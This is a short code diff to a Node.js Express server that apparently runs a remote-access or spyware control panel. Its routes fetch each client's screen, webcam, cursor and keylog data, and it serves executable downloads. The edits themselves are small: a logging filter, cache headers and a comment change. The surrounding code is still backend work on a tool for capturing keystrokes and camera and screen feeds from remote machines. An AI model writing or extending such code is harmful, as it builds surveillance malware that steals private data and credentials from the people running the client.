@@ -75,7 +75,7 @@ app.use(cookieParser());
 app.use((req, res, next) => {
   const t = Date.now();
   res.on('finish', () => {
-    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam') || req.path.endsWith('/cursor');
+    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam');
     if (!skip) console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
   });
   next();
@@ -497,11 +497,13 @@ app.get('/api/clients/:id/screen', requireAuth, (req, res) => {
 app.get('/api/clients/:id/cursor', requireAuth, (req, res) => {
   const cid = Number(req.params.id);
   const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
-
   if (!client) return res.status(404).json({ error: 'client not found' });
 
+  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
+  res.setHeader('Pragma', 'no-cache');
+
   const c = getCursor(cid);
-  console.log(`[cursor] id=${cid} getCursor=${c ? JSON.stringify(c) : 'null'}`);
+  console.log(`[cursor] id=${cid} => ${c ? JSON.stringify(c) : 'null'}`);
   if (!c) return res.status(204).end();
   res.json(c);
 });
@@ -614,7 +616,7 @@ app.delete('/api/clients/:id/keylog', requireAuth, (req, res) => {
 });
 
 
-// ---------- exe downloads (public, rate limited) ----------
+// ---------- exe downloads ----------
 const DOWNLOAD_DIR = path.join(__dirname, 'download');
 if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
 
